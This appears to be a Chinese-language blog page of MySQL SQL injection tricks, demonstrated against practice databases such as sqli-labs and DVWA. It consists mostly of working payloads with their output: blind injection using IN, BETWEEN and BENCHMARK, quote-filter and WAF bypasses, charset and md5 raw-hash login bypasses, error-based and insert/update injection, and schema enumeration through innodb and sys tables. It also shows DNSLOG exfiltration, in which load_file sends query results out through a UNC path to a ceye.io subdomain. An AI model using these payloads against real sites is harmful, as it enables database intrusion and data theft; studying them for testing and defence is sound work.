<p><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/124537.html">基于约束的SQL攻击</a></p>
<h2 id="IN"><a href="#IN" class="headerlink" title="IN"></a>IN</h2><p>在过滤等号或者过滤like等的sql注入情况下IN很有用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id in (1,2);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&#x27;abc&#x27;,1,1) in (&#x27;z&#x27;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| substr(&#x27;abc&#x27;,1,1) in (&#x27;z&#x27;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          0 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&#x27;abc&#x27;,1,1) in (&#x27;a&#x27;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| substr(&#x27;abc&#x27;,1,1) in (&#x27;a&#x27;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">|                          1 |</span><br><span class="line">+----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="Between"><a href="#Between" class="headerlink" title="Between"></a>Between</h2><p>BETWEEN操作符在WHERE子句中使用，作用是选取介于两个值之间的数据范围。也就说让我们可以运用一个范围(range)内抓出数据库中的值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id between 1 and 3;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where username between &#x27;sa&#x27; and &#x27;sz&#x27;;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  4 | secure   | crappy    |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  6 | superman | genious   |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">还支持16进制</span><br><span class="line">mysql&gt; select * from users where username between 0x7365 and 0x737a;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  4 | secure   | crappy    |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  6 | superman | genious   |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">可以结合字符串截取进行盲注</span><br><span class="line">mysql&gt; select * from users where substr(username,1,1) between &#x27;a&#x27; and &#x27;d&#x27;;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="列名被ban，自己构造"><a href="#列名被ban，自己构造" class="headerlink" title="列名被ban，自己构造"></a>列名被ban，自己构造</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select passwd from (select 1,2,3 as passwd union select * from users)as twoname;</span><br><span class="line">+------------+</span><br><span class="line">| passwd     |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| Dumb       |</span><br><span class="line">| I-kill-you |</span><br><span class="line">| p@ssword   |</span><br><span class="line">| crappy     |</span><br><span class="line">| stupidity  |</span><br><span class="line">+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="limit下的字段数判断"><a href="#limit下的字段数判断" class="headerlink" title="limit下的字段数判断"></a>limit下的字段数判断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users limit 1,1 into @,@;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">mysql&gt; select * from users limit 1,1 into @,@,@;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>or条件下前后如果都为真则返回所有结果，否则只返回条件为真的一方的值</strong></p>
<h2 id="BENCHMARK"><a href="#BENCHMARK" class="headerlink" title="BENCHMARK"></a>BENCHMARK</h2><p><strong>BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(left(version(),1)=5,BENCHMARK(10000000,SHA(&#x27;1&#x27;)),1);</span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">| if(left(version(),1)=5,BENCHMARK(10000000,SHA(&#x27;1&#x27;)),1) |</span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">|                                                      0 |</span><br><span class="line">+--------------------------------------------------------+</span><br><span class="line">1 row in set (3.60 sec)</span><br></pre></td></tr></table></figure>

<h2 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过 \&#39; 过滤"></a>绕过 <code>\&#39; </code>过滤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hex编码</span><br><span class="line">SELECT password FROM Users WHERE username = 0x61646D696E</span><br><span class="line"></span><br><span class="line">char编码</span><br><span class="line">SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</span><br><span class="line"></span><br><span class="line">%2527</span><br><span class="line">主要绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是&#x27;，所以成功绕过过滤。</span><br></pre></td></tr></table></figure>

<h2 id="Mysql字符编码利用"><a href="#Mysql字符编码利用" class="headerlink" title="Mysql字符编码利用"></a>Mysql字符编码利用</h2><p><strong>传入的username&#x3D;admin%c2，php的检测if ($username &#x3D;&#x3D;&#x3D; ‘admin’)自然就可以绕过的，在mysql中可以正常查出username&#x3D;’admin’的结果，原理是Mysql在转换字符集的时候，将不完整的字符给忽略了</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">造成这个Trick的根本原因是，Mysql字段的字符集和php mysqli客户端设置的字符集不相同。</span><br><span class="line">set names utf8 的意思是将客户端的字符集设置为utf8</span><br><span class="line"></span><br><span class="line">在默认情况下，mysql字符集为latin1，而执行了set names utf8;以后，character_set_client、</span><br><span class="line">character_set_connection、character_set_results等与客户端相关的配置字符集都变成了utf8，但</span><br><span class="line">character_set_database、character_set_server等服务端相关的字符集还是latin1。</span><br></pre></td></tr></table></figure>

<p><strong>2008年鸟哥曾在博客中讲解了Mysql字符集：</strong></p>
<blockquote>
<ol>
<li>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</li>
<li>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">character_set_client和character_set_connection被设置成了utf8，而内部操作字符集其实也就是username字段的</span><br><span class="line">字符集还是默认的latin1。于是，整个操作就有如下字符串转换过程：</span><br><span class="line"></span><br><span class="line">utf8 --&gt; utf8 --&gt; latin1</span><br><span class="line"></span><br><span class="line">最后执行比较username=&#x27;admin&#x27;的时候，&#x27;admin&#x27;是一个latin1字符串。</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html">phithon的文章</a></p>
<h2 id="md5注入"><a href="#md5注入" class="headerlink" title="md5注入"></a>md5注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM admin WHERE username = admin pass =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为’or’ 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。</strong></p>
<h2 id="Update-和-Insert注入"><a href="#Update-和-Insert注入" class="headerlink" title="Update 和 Insert注入"></a>Update 和 Insert注入</h2><h3 id="闭合后构造"><a href="#闭合后构造" class="headerlink" title="闭合后构造"></a>闭合后构造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,&#x27;注入点&#x27;, &#x27;bond&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>若第一个参数可控，则可以将注入点闭合后，在后面使用不被单引号闭合的select语句，将查询结果插入表中，然后再想办法通过正常途径查看。</strong><br>* 数字相加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,&#x27;join&#x27;, &#x27;注入点&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>注入点变为了第二个，不能同闭合直接构造。但可以通过把想要获取的数据转换为数字，然后与原字符串相加，获取数字后再还原回来。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">insert into users values (17,&#x27;james&#x27;, &#x27;bond&#x27;|conv(hex(substr(user(),1 + (n-1) * 8, 8* n)),16, 10);</span><br><span class="line"></span><br><span class="line">CONV(N,from_base,to_base)</span><br><span class="line">mysql&gt; select &#x27;sssdasd&#x27;|2;</span><br><span class="line">+-------------+</span><br><span class="line">| &#x27;sssdasd&#x27;|2 |</span><br><span class="line">+-------------+</span><br><span class="line">|           2 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#x27;1sssdasd&#x27;|2;</span><br><span class="line">+--------------+</span><br><span class="line">| &#x27;1sssdasd&#x27;|2 |</span><br><span class="line">+--------------+</span><br><span class="line">|            3 |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="构造错误"><a href="#构造错误" class="headerlink" title="构造错误"></a>构造错误</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table 1 VALUES (‘注入点’);</span><br></pre></td></tr></table></figure>

<p><strong>对于非SELECT注入，如果成功执行的话会修改数据库数据。实战过程中不但会破坏数据库结构（白帽子挖洞的时候很可能因为这个违法），还容易引起管理员注意。所以在不让SQL语句正常执行的情况下获取数据是最好的方法。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table 1 VALUES (&#x27;&#x27;+  SELECT CASE WHEN @@version LIKE &#x27;5.1.56%&#x27; </span><br><span class="line">THEN SLEEP(5) ELSE &#x27;somevale&#x27; END + &#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>因为返回了多列数据，该insert语句并不会执行，但是内部的select语句和sleep函数会照常执行，也就可以通过写脚本获取数据了。</strong></p>
<h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into users value(null,&#x27;p&#x27; and extractvalue(1,concat(0x7e,(select @@version),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br><span class="line">mysql&gt; update users set username=&#x27;test&#x27; where id=1 and extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.5.53~&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="DNSLOG注入"><a href="#DNSLOG注入" class="headerlink" title="DNSLOG注入"></a>DNSLOG注入</h2><p>利用unc路径配合load_file()函数可以用来发送dns解析请求，把查询结果放在多级域名中解析，然后能够在dns服务器的解析日志中获取查询结果。<br>- unc路径是windows下的特性，默认安装的linux下不存在这样的功能。<br>- 因为存在dns缓存，请求过一次域名后，会在本机产生dns记录，不会向外递归查询，所以unc路径中DNS域名不能相同。通过在域名中添加随机字符串’rMy’,’Nrz’确保每次查询dns不存在缓存<br>- unc路径长度不能过长，unc路径最大长度为128，可以通过使用substring（）函数每次传输特定位数的数据。<br>- unc路径中不能含有空格等特殊字符，包含的话不会发送dns请求。可以对获得数据进行hex编码</p>
<p><strong>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</strong><br>dnslog平台：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use security;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(&#x27;\\\\test.xxx.ceye.io\\abc&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| load_file(&#x27;\\\\test.xxx.ceye.io\\abc&#x27;) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| NULL                                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (22.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.ceye.io\\abc&#x27;));</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.ceye.io\\abc&#x27;)) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| NULL                                                                 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="Bypass-WAF"><a href="#Bypass-WAF" class="headerlink" title="Bypass WAF"></a>Bypass WAF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">一些WAF只过滤小写的SQL关键字。</span><br><span class="line">http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--</span><br><span class="line"></span><br><span class="line">某些应用程序和WAF使用preg_replace删除所有SQL关键字。</span><br><span class="line">http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--</span><br><span class="line"></span><br><span class="line">大多数CMS和WAF将解码和过滤/绕过应用程序输入，但一些WAF只能解码输入一次 </span><br><span class="line">双编码可以绕过某些滤波器，因为WAF将解码输入一次，然后在应用程序保持时进行滤波解码执行的SQL语句</span><br><span class="line"></span><br><span class="line">使用C语言编写的WAF容易溢出，或者在加载一堆数据时采取不同的行为。提供大量的数据可以让我们的代码执行 </span><br><span class="line"></span><br><span class="line">内联注释（仅限Mysql）</span><br><span class="line">/*!50000SeLeCt*/大于5.0的版本可以执行</span><br><span class="line"></span><br><span class="line">使用~</span><br><span class="line">mysql&gt; select * from user union select 1,2,~3,~4;</span><br><span class="line">+----+----------+----------------------------------+----------------------+</span><br><span class="line">| id | username | passwd                           | role                 |</span><br><span class="line">+----+----------+----------------------------------+----------------------+</span><br><span class="line">|  1 | admin    | 9135967b6c6b40aa49f070360ea99b1f | admin                |</span><br><span class="line">|  1 | 2        | 18446744073709551612             | 18446744073709551611 |</span><br><span class="line">+----+----------+----------------------------------+----------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">使用小数点(.)</span><br><span class="line">mysql&gt; select * from user union select 1,2,.3,.4;</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">| id | username | passwd                           | role  |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">|  1 | admin    | 9135967b6c6b40aa49f070360ea99b1f | admin |</span><br><span class="line">|  1 | 2        | 0.3                              | 0.4   |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">使用字符（*9e0）</span><br><span class="line">*9e0和前面的id=1′和起来，后台查询语句可能就变成了select * from user where id=&#x27;1&#x27;*9e0;而在mysql中9e0表示9乘10的0次方，所以mysql会把上面字符串1强制转换成数值1再乘9，语句也就变成了select * from article where id=&#x27;1′</span><br><span class="line">mysql&gt; select * from user where id=&#x27;1&#x27; *9e0 union select 1,2,3,4;</span><br><span class="line">+----+----------+--------+------+</span><br><span class="line">| id | username | passwd | role |</span><br><span class="line">+----+----------+--------+------+</span><br><span class="line">|  1 | 2        | 3      | 4    |</span><br><span class="line">+----+----------+--------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">字符串前如from前加e0</span><br><span class="line">mysql&gt; select * from user where id=1 union select 1,2,3,4e0from user;</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">| id | username | passwd                           | role  |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">|  1 | admin    | 9135967b6c6b40aa49f070360ea99b1f | admin |</span><br><span class="line">|  1 | 2        | 3                                | 4     |</span><br><span class="line">+----+----------+----------------------------------+-------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="innodb"><a href="#innodb" class="headerlink" title="innodb"></a>innodb</h2><p><strong><code>MySQL 5.7</code>之后的版本，在其自带的 mysql 库中，新增了<code>innodb_table_stats</code> 和<code>innodb_index_stats</code>这两张日志表。如果数据表的引擎是<code>innodb</code> ，则会在这两张表中记录表、键的信息 。</strong><br>如果waf掉了information我们可以利用这两个表注入数据库名和表名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.innodb_table_stats;</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| database_name | table_name    | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">| challenges    | ZGRW907ENU    | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |</span><br><span class="line">| dvwa          | guestbook     | 2018-04-21 23:00:47 |      0 |                    1 |                        0 |</span><br><span class="line">| dvwa          | users         | 2018-04-21 23:00:57 |      5 |                    1 |                        0 |</span><br><span class="line">| mysql         | gtid_executed | 2018-04-21 22:47:54 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | emails        | 2018-05-18 01:55:43 |      8 |                    1 |                        0 |</span><br><span class="line">| security      | fish_admin    | 2018-11-27 18:28:51 |      0 |                    1 |                        1 |</span><br><span class="line">| security      | flag          | 2018-09-18 05:16:14 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | referers      | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | uagents       | 2018-05-18 01:55:43 |      0 |                    1 |                        0 |</span><br><span class="line">| security      | users         | 2018-05-18 01:55:43 |     13 |                    1 |                        0 |</span><br><span class="line">| sys           | sys_config    | 2018-04-21 22:47:54 |      2 |                    1 |                        0 |</span><br><span class="line">+---------------+---------------+---------------------+--------+----------------------+--------------------------+</span><br><span class="line">11 rows in set (0.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt; select * from mysql.innodb_index_stats;</span><br><span class="line">+---------------+---------------+------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| database_name | table_name    | index_name | last_update         | stat_name    | stat_value | sample_size | stat_description                  |</span><br><span class="line">+---------------+---------------+------------+---------------------+--------------+------------+-------------+-----------------------------------+</span><br><span class="line">| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | n_diff_pfx01 |          0 |           1 | sessid                            |</span><br><span class="line">| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| challenges    | ZGRW907ENU    | PRIMARY    | 2018-05-18 01:55:43 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | n_diff_pfx01 |          0 |           1 | comment_id                        |</span><br><span class="line">| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| dvwa          | guestbook     | PRIMARY    | 2018-04-21 23:00:47 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | n_diff_pfx01 |          5 |           1 | user_id                           |</span><br><span class="line">| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| dvwa          | users         | PRIMARY    | 2018-04-21 23:00:57 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_diff_pfx01 |          0 |           1 | source_uuid                       |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_diff_pfx02 |          0 |           1 | source_uuid,interval_start        |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">| mysql         | gtid_executed | PRIMARY    | 2018-04-21 22:47:54 | size         |          1 |        NULL | Number of pages in the index      |</span><br><span class="line">| security      | emails        | PRIMARY    | 2018-05-18 01:55:43 | n_diff_pfx01 |          8 |           1 | id                                |</span><br><span class="line">| security      | emails        | PRIMARY    | 2018-05-18 01:55:43 | n_leaf_pages |          1 |        NULL | Number of leaf pages in the index |</span><br><span class="line">...............</span><br></pre></td></tr></table></figure>

<h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>MySQL 5.7版中，新加入了<code>sys</code> schema，里面整合了各种资料库资讯<br>其中对我们最有用的资讯大概就是<code>statement_analysis</code>表中的<code>query</code>，里面纪录着我们执行过的SQL语句（normalize过的）和一些数据。</p>
